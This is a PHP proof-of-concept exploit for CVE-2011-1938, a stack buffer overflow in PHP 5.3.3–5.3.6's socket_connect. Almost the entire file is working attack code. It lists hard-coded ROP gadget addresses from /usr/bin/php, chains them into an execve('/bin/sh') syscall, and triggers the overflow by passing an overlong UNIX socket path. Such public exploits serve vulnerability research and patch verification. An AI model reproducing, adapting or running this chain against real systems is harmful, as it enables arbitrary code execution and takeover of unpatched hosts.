<?php
/*
** Jonathan Salwan - @shell_storm
** http://shell-storm.org
** 2011-06-04
**
** http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-1938
**
** Stack-based buffer overflow in the socket_connect function in ext/sockets/sockets.c
** in PHP 5.3.3 through 5.3.6 might allow context-dependent attackers to execute arbitrary
** code via a long pathname for a UNIX socket.
*/

echo "[+] PHP 5.3.6 Buffer Overflow PoC (ROP)\n";
echo "[+] CVE-2011-1938\n\n";

# Gadgets in /usr/bin/php
define('DUMMY',     "\x42\x42\x42\x42"); // padding
define('STACK',     "\x20\xba\x74\x08"); // .data 0x46a0   0x874ba20
define('STACK4',    "\x24\xba\x74\x08"); // STACK + 4
define('STACK8',    "\x28\xba\x74\x08"); // STACK + 8
define('STACK12',   "\x3c\xba\x74\x08"); // STACK + 12
define('INT_80',    "\x27\xb6\x07\x08"); // 0x0807b627: int $0x80
define('INC_EAX',   "\x66\x50\x0f\x08"); // 0x080f5066: inc %eax | ret
define('XOR_EAX',   "\x60\xb4\x09\x08"); // 0x0809b460: xor %eax,%eax | ret
define('MOV_A_D',   "\x84\x3e\x12\x08"); // 0x08123e84: mov %eax,(%edx) | ret
define('POP_EBP',   "\xc7\x48\x06\x08"); // 0x080648c7: pop %ebp | ret
define('MOV_B_A',   "\x18\x45\x06\x08"); // 0x08064518: mov %ebp,%eax | pop %ebx | pop %esi | pop %edi | pop %ebp | ret
define('MOV_DI_DX', "\x20\x26\x07\x08"); // 0x08072620: mov %edi,%edx | pop %esi | pop %edi | pop %ebp | ret
define('POP_EDI',   "\x23\x26\x07\x08"); // 0x08072623: pop %edi | pop %ebp | ret
define('POP_EBX',   "\x0f\x4d\x21\x08"); // 0x08214d0f: pop %ebx | pop %esi | pop %edi | pop %ebp | ret
define('XOR_ECX',   "\xe3\x3b\x1f\x08"); // 0x081f3be3: xor %ecx,%ecx | pop %ebx | mov %ecx,%eax | pop %esi | pop %edi | pop %ebp | ret

$padd = str_repeat("A", 196);

$payload = POP_EDI.   // pop %edi
           STACK.     // 0x874ba20
           DUMMY.     // pop %ebp
           MOV_DI_DX. // mov %edi,%edx
           DUMMY.     // pop %esi
           DUMMY.     // pop %edi
           "//bi".    // pop %ebp
           MOV_B_A.   // mov %ebp,%eax
           DUMMY.     // pop %ebx
           DUMMY.     // pop %esi
           DUMMY.     // pop %edi
           DUMMY.     // pop %ebp
           MOV_A_D.   // mov %eax,(%edx)
           POP_EDI.   // pop %edi
           STACK4.    // 0x874ba24
           DUMMY.     // pop %ebp
           MOV_DI_DX. // mov %edi,%edx
           DUMMY.     // pop %esi
           DUMMY.     // pop %edi
           "n/sh".    // pop %ebp
           MOV_B_A.   // mov %ebp,%eax
           DUMMY.     // pop %ebx
           DUMMY.     // pop %esi
           DUMMY.     // pop %edi
           DUMMY.     // pop %ebp
           MOV_A_D.   // mov %eax,(%edx)
           POP_EDI.   // pop %edi
           STACK8.    // 0x874ba28
           DUMMY.     // pop %ebp
           MOV_DI_DX. // mov %edi,%edx
           DUMMY.     // pop %esi
           DUMMY.     // pop %edi
           DUMMY.     // pop %ebp
           XOR_EAX.   // xor %eax,%eax
           MOV_A_D.   // mov %eax,(%edx)
           XOR_ECX.   // xor %ecx,%ecx
           DUMMY.     // pop %ebx
           DUMMY.     // pop %esi
           DUMMY.     // pop %edi
           DUMMY.     // pop %ebp
           POP_EBX.   // pop %ebx
           STACK.     // 0x874ba20
           DUMMY.     // pop %esi
           DUMMY.     // pop %edi
           DUMMY.     // pop %ebp
           XOR_EAX.   // xor %eax,%eax
           INC_EAX.   // inc %eax
           INC_EAX.   // inc %eax
           INC_EAX.   // inc %eax
           INC_EAX.   // inc %eax
           INC_EAX.   // inc %eax
           INC_EAX.   // inc %eax
           INC_EAX.   // inc %eax
           INC_EAX.   // inc %eax
           INC_EAX.   // inc %eax
           INC_EAX.   // inc %eax
           INC_EAX.   // inc %eax
           INT_80;    // int $0x80

$evil = $padd.$payload;

$fd   = socket_create(AF_UNIX, SOCK_STREAM, 1);
$ret  = socket_connect($fd, $evil);
?>
